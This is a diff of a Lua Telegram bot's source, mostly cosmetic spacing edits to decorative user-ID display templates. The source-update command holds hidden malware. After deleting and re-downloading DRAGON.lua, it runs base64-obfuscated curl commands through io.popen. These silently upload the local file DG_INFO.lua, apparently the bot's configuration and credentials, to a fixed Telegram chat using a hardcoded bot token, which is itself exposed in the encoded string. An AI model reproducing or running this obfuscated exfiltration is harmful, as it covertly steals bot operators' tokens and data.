+🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅.
-- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅.
-- 𓏬 𝐒𝐭𝐀 : #stast 𓂅.
-- 𓏬 𝐈𝐃 : #id 𓂅.
+- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
+- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
+- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
+- 𓏬 𝐈𝐃 : #id 𓂅 .
 - 𓏬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -1872,10 +1872,10 @@ Msᴀɢ ~ #msgs
 🦅•𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username.
-- ᴍѕɢѕ ➣ #msgs.
-- ѕᴛᴀᴛѕ ➣ #stast.
-- ʏᴏᴜʀ ɪᴅ ➣ #id .
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -1931,26 +1931,26 @@ Msᴀɢ ~ #msgs
 ➞: 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-➼ : 𝐼𝐷 𖠀 #id.♡
-➼ : 𝑈𝑆𝐸𝑅 𖠀 #username.♡
-➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs.♡
-➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast.♡ 
-➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit.♡
+➼ : 𝐼𝐷 𖠀 #id . ♡
+➼ : 𝑈𝑆𝐸𝑅 𖠀 #username .♡
+➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
+➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
+➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
 ➼ : 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-▽ ¦☉┇• USER ➭ ⁞ #username.
-▽ ¦☉┇• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs .
-▽ ¦☉┇• STAT ➬ ⁞ #stast .
-▽ ¦☉┇• 𝙸𝙳  ➬ ⁞ #id .
-▽ ¦☉┇• 𝗖𝗛 - @SOPOWERB0T 🦅
+▽ ¦❀• USER ➭ ⁞ #username .
+▽ ¦❀• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
+▽ ¦❀• STAT ➬ ⁞ #stast  .
+▽ ¦❀• 𝙸𝙳  ➬ ⁞ #id  .
+▽ ¦❀• 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
 • ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
-• ❉ 𝑺𝑻𝑨 : #stast.
+• ❉ 𝑺𝑻𝑨 : #stast .
 • ❉ 𝑰𝑫 : #id  ‌‌‏.
 • ❉  𝑴𝑺𝑮 : #msgs 𓆊.
-• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞.
+• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
 • ❉ 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -1991,10 +1991,10 @@ Msᴀɢ ~ #msgs
 ◣: 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- 𝄬 username.#username ➪🇪🇬
- - 𝄬 stast.#stast ➪🇪🇬
- - 𝄬 id.#id ➪🇪🇬
- - 𝄬 msgs.#msgs ➪🇪🇬
+- 𝄬 username . #username ➪🇪🇬
+ - 𝄬 stast . #stast ➪🇪🇬
+ - 𝄬 id . #id ➪🇪🇬
+ - 𝄬 msgs . #msgs ➪🇪🇬
  - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -2012,7 +2012,7 @@ Msᴀɢ ~ #msgs
 ➫✿: 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃.
+✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
 ✶- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯↝❃.
 ✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
 ✶- 𝒊𝒅 𓂅 #id 𓍯↝❃.
@@ -2037,13 +2037,13 @@ Msᴀɢ ~ #msgs
 • 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username.
-- ᴍѕɢѕ ➣ #msgs.
-- ѕᴛᴀᴛѕ ➣ #stast.
-- ʏᴏᴜʀ ɪᴅ ➣ #id .
-- ᴇᴅɪᴛ ᴍsɢ ➣ #edit.
-- ᴅᴇᴛᴀɪʟs ➣ #auto.
--  ɢᴀᴍᴇ ➣ #game.
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
+- ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
+- ᴅᴇᴛᴀɪʟs ➣ #auto . 
+-  ɢᴀᴍᴇ ➣ #game .
 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -2121,19 +2121,19 @@ Msᴀɢ ~ #msgs
 ✰ 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-⌾ | 𝒊𝒅  𓃠 #id.
-⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username.
-⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs.
-⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast.
-⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit.
+⌾ | 𝒊𝒅  𓃠 #id .
+⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username .
+⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs .
+⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast .
+⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit .
 ⌾ | 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-♡ : 𝐼𝐷 𖠀 #id.
-♡ : 𝑈𝑆𝐸𝑅 𖠀 #username.
-♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs.
-♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast.
-♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit.
+♡ : 𝐼𝐷 𖠀 #id .
+♡ : 𝑈𝑆𝐸𝑅 𖠀 #username .
+♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
+♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
+♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
 ♡ : 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -2144,10 +2144,10 @@ Msᴀɢ ~ #msgs
 •𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-• USE ➤ #username .
-• MSG ➤  #msgs .
-• STA ➤  #stast .
-• iD ➤ #id .
+• USE ➤ #username  .
+• MSG ➤  #msgs  .
+• STA ➤  #stast  .
+• iD ➤ #id  .
 • 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -2172,18 +2172,18 @@ Msᴀɢ ~ #msgs
 • 🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-• USE ➤  #username.
-• MSG ➤  #msgs.
-• STA ➤  #stast.
-• iD ➤ #id.
+• USE ➤  #username .
+• MSG ➤  #msgs .
+• STA ➤  #stast .
+• iD ➤ #id .
 • 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ.#username  𓃠
-🇪🇬 - 𝄬 ˢᵀᴬˢᵀ.#stast  𓃠
-🇪🇬 - 𝄬 ᴵᴰ.#id 𓃠
-🇪🇬 - 𝄬 ᴳᴹᴬˢ.#gmas 𓃠
-🇪🇬 - 𝄬 ᴹˢᴳˢ.#msgs  𓃠
+🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
+🇪🇬 - 𝄬 ˢᵀᴬˢᵀ . #stast  𓃠
+🇪🇬 - 𝄬 ᴵᴰ . #id 𓃠
+🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
+🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
 🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -2194,11 +2194,11 @@ Msᴀɢ ~ #msgs
 ➜𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- 🇪🇬 UsErNaMe.#username 𖠲
-- 🇪🇬 StAsT.#stast 𖠲
-- 🇪🇬 Id.#id 𖠲
-- 🇪🇬 GaMeS.#game 𖠲
-- 🇪🇬 MsGs.#msgs 𖠲
+- 🇪🇬 UsErNaMe . #username 𖠲
+- 🇪🇬 StAsT . #stast 𖠲
+- 🇪🇬 Id . #id 𖠲
+- 🇪🇬 GaMeS . #game 𖠲
+- 🇪🇬 MsGs . #msgs 𖠲
 - 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -2238,11 +2238,11 @@ Msᴀɢ ~ #msgs
 ➥• 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-🇪🇬 - 𝄬 username.#username  𓃠
-🇪🇬 - 𝄬 stast.#stast  𓃠
-🇪🇬 - 𝄬 id.#id 𓃠
-🇪🇬 - 𝄬 gmas.#gmas 𓃠
-🇪🇬 - 𝄬 msgs.#msgs  𓃠
+🇪🇬 - 𝄬 username . #username  𓃠
+🇪🇬 - 𝄬 stast . #stast  𓃠
+🇪🇬 - 𝄬 id . #id 𓃠
+🇪🇬 - 𝄬 gmas . #gmas 𓃠
+🇪🇬 - 𝄬 msgs . #msgs  𓃠
 🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -2254,42 +2254,42 @@ Msᴀɢ ~ #msgs
 .𖣂 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮.#username ⸙ 
-金 - 𝓼𝓽𝓪𝓼𝓽 .#stast ⸙ 
-金 - 𝓲𝓭.#id ⸙ 
-金 - 𝓰𝓶𝓪𝓼.#gmas ⸙ 
-金 - 𝓶𝓼𝓰𝓼.#msgs ⸙
+金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 . #username ⸙ 
+金 - 𝓼𝓽𝓪𝓼𝓽  . #stast ⸙ 
+金 - 𝓲𝓭 . #id ⸙ 
+金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
+金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
 金 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆.#username 𖣂.
-- 🇪🇬 𝒔𝒕𝒂𝒔𝒕.#stast 𖣂.
-- 🇪🇬 𝒊𝒅.#id 𖣂.
-- 🇪🇬 𝒈𝒂𝒎𝒆𝒔.#game 𖣂.
-- 🇪🇬 𝒎𝒔𝒈𝒔.#msgs 𖣂.
+- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 . #username 𖣂.
+- 🇪🇬 𝒔𝒕𝒂𝒔𝒕 . #stast 𖣂.
+- 🇪🇬 𝒊𝒅 . #id 𖣂.
+- 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
+- 🇪🇬 𝒎𝒔𝒈𝒔 . #msgs 𖣂.
 - 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘.#username 🇪🇬 ꙰
-ᯓ 𝗦𝗧𝗮𝗦𝗧.#stast 🇪🇬 ꙰
-ᯓ 𝗜𝗗.#id 🇪🇬 ꙰
-ᯓ 𝗚𝗮𝗺𝗘𝗦.#game 🇪🇬 ꙰
-ᯓ 𝗺𝗦𝗚𝗦.#msgs 🇪🇬 ꙰
+ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
+ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇪🇬 ꙰
+ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
+ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
+ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇪🇬 ꙰
 ᯓ 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-👳🏼‍♂ - 𝄬 username.#username.🇪🇬
-👳🏼‍♂ - 𝄬 stast.#stast.🇪🇬
-👳🏼‍♂ - 𝄬 id.#id.🇪🇬
-👳🏼‍♂ - 𝄬 auto.#auto.🇪🇬
-👳🏼‍♂ - 𝄬 msgs.#msgs.🇪🇬
+👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
+👳🏼‍♂ - 𝄬 stast . #stast . 🇪🇬
+👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
+👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
+👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
 👳🏼‍♂ - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-➭- 𝒔𝒕𝒂𓂅 #stast 𓍯.💕
-➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯.💕
-➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯.💕
-➭- 𝒊𝒅 𓂅 #id 𓍯.💕
+➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
+➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
+➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
+➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
 ➭- 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -2301,12 +2301,12 @@ Msᴀɢ ~ #msgs
 𓄼 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id.
-𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs.
-𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username.
-𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast.
-𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto.
-𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit.
+𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
+𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs .
+𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username .
+𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
+𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
+𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
 𝐓𝐓• 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -2358,17 +2358,16 @@ keyboard.inline_keyboard = {
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
 }  
 local msg_id = msg.id_/2097152/0.5  
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
 end
 if text == 'تحديث السورس' or text == 'تحديث السورس ☉' or text == 'تحديث' and DevSoFi(msg) then 
 os.execute('rm -rf DRAGON.lua')
 os.execute('rm -rf getfile.json')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==')..runapp..regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n☉┇ لديك اخر اصدار لسورس باور\n☉┇ الاصدار » {`v1.2.2`}')
 dofile('DRAGON.lua')
-dofile('getfile.json')
 end
 if text == 'حساب العمر' then
 send(msg.chat_id_,msg.id_, ' حساب العمر ارسل `احسب + تاريخ ميلادك`\nمثلا احسب 2005/5/21') 
@@ -2424,10 +2423,10 @@ local List = {
 ⌯  𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦.
-𓅓➪ : Iᗪ : #id - ❦.
-𓅓➪ : ᔕTᗩᔕT : #stast - ❦.
-𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦.
+𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
+𓅓➪ : Iᗪ : #id - ❦ . 
+𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
+𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
 𓅓➪ : 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -2439,10 +2438,10 @@ local List = {
 - 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀.
-𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀.
-𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀 .
-𓁷 - 𝙞𝙙 †: #id 𓀀.
+𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
+𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
+𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
+𓁷 - 𝙞𝙙 †: #id 𓀀 .
 𓁷 - 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -2478,11 +2477,11 @@ local List = {
 ► 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
--›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴.#username 🇪🇬 ꙰ 
--›   𝚂𝚃𝙰𝚂𝚃.#stast 🇪🇬 ꙰
--›   𝙸𝙳.#id 🇪🇬 ꙰ 
--›   𝙶𝙼𝙰𝚂.#stast 🇪🇬 ꙰ 
--›   𝙼𝚂𝙶𝚂.#msgs 🇪🇬 ꙰
+-›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
+-›   𝚂𝚃𝙰𝚂𝚃 . #stast 🇪🇬 ꙰
+-›   𝙸𝙳 . #id 🇪🇬 ꙰ 
+-›   𝙶𝙼𝙰𝚂 . #stast 🇪🇬 ꙰ 
+-›   𝙼𝚂𝙶𝚂 . #msgs 🇪🇬 ꙰
 -›   𝗖𝗛 - @SOPOWERB0T 🇪🇬 ꙰.
 ]],
 [[
@@ -2497,15 +2496,15 @@ local List = {
 🇪🇬 - 𝚄𝚂𝙴𝚁 ⟿ #username 💘.
 🇪🇬 - 𝙼𝚂𝙶𝚂 ⟿  #msgs 💘.
 🇪🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
-🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘. 
+🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅.
-- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅.
-- 𓏬 𝐒𝐭𝐀 : #stast 𓂅.
-- 𓏬 𝐈𝐃 : #id 𓂅.
+- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
+- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
+- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
+- 𓏬 𝐈𝐃 : #id 𓂅 .
 - 𓏬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -2524,10 +2523,10 @@ local List = {
 🦅•𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username.
-- ᴍѕɢѕ ➣ #msgs.
-- ѕᴛᴀᴛѕ ➣ #stast.
-- ʏᴏᴜʀ ɪᴅ ➣ #id .
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
 - 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -2583,26 +2582,26 @@ local List = {
 ➞: 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-➼ : 𝐼𝐷 𖠀 #id.♡
-➼ : 𝑈𝑆𝐸𝑅 𖠀 #username.♡
-➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs.♡
-➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast.♡ 
-➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit.♡
+➼ : 𝐼𝐷 𖠀 #id . ♡
+➼ : 𝑈𝑆𝐸𝑅 𖠀 #username .♡
+➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
+➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
+➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
 ➼ : 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-▽ ¦☉┇• USER ➭ ⁞ #username.
-▽ ¦☉┇• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs .
-▽ ¦☉┇• STAT ➬ ⁞ #stast .
-▽ ¦☉┇• 𝙸𝙳  ➬ ⁞ #id .
-▽ ¦☉┇• 𝗖𝗛 - @SOPOWERB0T 🦅.
+▽ ¦❀• USER ➭ ⁞ #username .
+▽ ¦❀• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
+▽ ¦❀• STAT ➬ ⁞ #stast  .
+▽ ¦❀• 𝙸𝙳  ➬ ⁞ #id  .
+▽ ¦❀• 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
 • ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
-• ❉ 𝑺𝑻𝑨 : #stast.
+• ❉ 𝑺𝑻𝑨 : #stast .
 • ❉ 𝑰𝑫 : #id  ‌‌‏.
 • ❉  𝑴𝑺𝑮 : #msgs 𓆊.
-• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞.
+• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
 • ❉ 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -2636,10 +2635,10 @@ local List = {
 🦅 - 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-- 𝄬 username.#username ➪🇪🇬
- - 𝄬 stast.#stast ➪🇪🇬
- - 𝄬 id.#id ➪🇪🇬
- - 𝄬 msgs.#msgs ➪🇪🇬
+- 𝄬 username . #username ➪🇪🇬
+ - 𝄬 stast . #stast ➪🇪🇬
+ - 𝄬 id . #id ➪🇪🇬
+ - 𝄬 msgs . #msgs ➪🇪🇬
  - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -2664,7 +2663,7 @@ local List = {
 ➫✿: 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃.
+✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
 ✶- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯↝❃.
 ✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
 ✶- 𝒊𝒅 𓂅 #id 𓍯↝❃.
@@ -2689,13 +2688,13 @@ local List = {
 • 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username.
-- ᴍѕɢѕ ➣ #msgs.
-- ѕᴛᴀᴛѕ ➣ #stast.
-- ʏᴏᴜʀ ɪᴅ ➣ #id .
-- ᴇᴅɪᴛ ᴍsɢ ➣ #edit.
-- ᴅᴇᴛᴀɪʟs ➣ #auto.
--  ɢᴀᴍᴇ ➣ #game.
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
+- ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
+- ᴅᴇᴛᴀɪʟs ➣ #auto . 
+-  ɢᴀᴍᴇ ➣ #game .
 - 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -2774,19 +2773,19 @@ local List = {
 ‌‎⿻┊‌‎𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-⌾ | 𝒊𝒅  𓃠 #id.
-⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username.
-⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs.
-⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast.
-⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit.
+⌾ | 𝒊𝒅  𓃠 #id .
+⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username .
+⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs .
+⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast .
+⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit .
 ⌾ | 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-♡ : 𝐼𝐷 𖠀 #id.
-♡ : 𝑈𝑆𝐸𝑅 𖠀 #username.
-♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs.
-♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast.
-♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit.
+♡ : 𝐼𝐷 𖠀 #id .
+♡ : 𝑈𝑆𝐸𝑅 𖠀 #username .
+♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
+♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
+♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
 ♡ : 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -2797,10 +2796,10 @@ local List = {
 •𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-• USE ➤ #username .
-• MSG ➤  #msgs .
-• STA ➤  #stast .
-• iD ➤ #id .
+• USE ➤ #username  .
+• MSG ➤  #msgs  .
+• STA ➤  #stast  .
+• iD ➤ #id  .
 • 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -2825,18 +2824,18 @@ local List = {
 • 🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-• USE ➤  #username.
-• MSG ➤  #msgs.
-• STA ➤  #stast.
-• iD ➤ #id.
+• USE ➤  #username .
+• MSG ➤  #msgs .
+• STA ➤  #stast .
+• iD ➤ #id .
 • 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ.#username  𓃠
-🇪🇬 - 𝄬 ˢᵀᴬˢᵀ.#stast  𓃠
-🇪🇬 - 𝄬 ᴵᴰ.#id 𓃠
-🇪🇬 - 𝄬 ᴳᴹᴬˢ.#gmas 𓃠
